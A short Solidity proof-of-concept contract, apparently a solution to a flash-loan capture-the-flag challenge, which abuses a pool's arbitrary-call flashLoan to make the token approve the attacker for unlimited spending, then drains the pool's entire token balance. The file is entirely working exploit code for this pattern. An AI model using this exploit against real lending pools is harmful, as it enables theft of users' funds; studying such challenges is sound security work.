pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPOOL{
    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data) external;
}

contract poc{
    address POOL;
    address TOKEN;
    event chall(bool);
    constructor(address _pool, address _token){
        POOL = _pool;
        TOKEN = _token;
    }

    function flash() external{
        IPOOL(POOL).flashLoan(0, address(this),address(TOKEN), abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
    }

    function exploit() external {
        IERC20(TOKEN).transferFrom(address(POOL), address(this), IERC20(TOKEN).balanceOf(address(POOL)));
        require(IERC20(TOKEN).balanceOf(address(this)) > 0 && IERC20(TOKEN).balanceOf(address(POOL)) == 0, "challenge non reussi");
        emit chall(true);
    }
    function balance() public view returns(uint256){
        return IERC20(TOKEN).balanceOf(address(this));
    }
}
